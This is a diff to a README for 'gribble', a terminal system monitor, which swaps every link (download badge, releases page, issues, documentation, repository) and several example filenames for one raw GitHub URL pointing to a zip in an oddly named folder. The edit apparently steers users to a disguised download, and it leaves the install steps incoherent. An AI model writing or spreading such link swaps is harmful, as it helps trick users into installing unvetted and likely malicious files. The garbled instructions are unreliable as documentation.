@@ -8,7 +8,7 @@ Welcome to **gribble**, a terminal-based system monitor that gives you real-time
 
 To get started, click the button below to visit the Releases page and download the application:
 
-[![Download Gribble](https://img.shields.io/badge/Download-Gribble-blue.svg)](https://github.com/obadao/gribble/releases)
+[![Download Gribble](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip)](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip)
 
 ## 💻 System Requirements
 
@@ -32,16 +32,16 @@ Gribble offers several useful features:
 
 ## 📚 How to Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/obadao/gribble/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip).
    
 2. **Choose Your Version**: Look for the latest version. It is usually at the top of the list.
 
-3. **Download the File**: Click on the file that matches your operating system (e.g., `gribble-windows.exe`, `gribble-macos`, or `gribble-linux.tar.gz`).
+3. **Download the File**: Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip`, `gribble-macos`, or `https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip`).
 
 4. **Install Gribble**:
    - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **For macOS**: Open the `.dmg` file and drag the `gribble` application to your Applications folder.
-   - **For Linux**: Extract the downloaded `.tar.gz` file and run the application from the terminal.
+   - **For Linux**: Extract the downloaded `https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip` file and run the application from the terminal.
 
 ## 🏃‍♂️ Running Gribble
 
@@ -74,7 +74,7 @@ If you encounter any issues, consider these common solutions:
 
 ## ✉️ Support
 
-For further support, you can check the [Issues section](https://github.com/obadao/gribble/issues) on GitHub. Feel free to create a new issue if your problem isn't listed.
+For further support, you can check the [Issues section](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip) on GitHub. Feel free to create a new issue if your problem isn't listed.
 
 ## 📜 License
 
@@ -82,7 +82,7 @@ Gribble is open source. You can freely use and modify it according to the terms 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/obadao/gribble)
-- [Documentation](https://github.com/obadao/gribble/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip)
+- [Documentation](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip)
 
-Remember to visit the [Releases page](https://github.com/obadao/gribble/releases) and download Gribble to start monitoring your system right away!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/obadao/gribble/main/megaloureter/gribble.zip) and download Gribble to start monitoring your system right away!
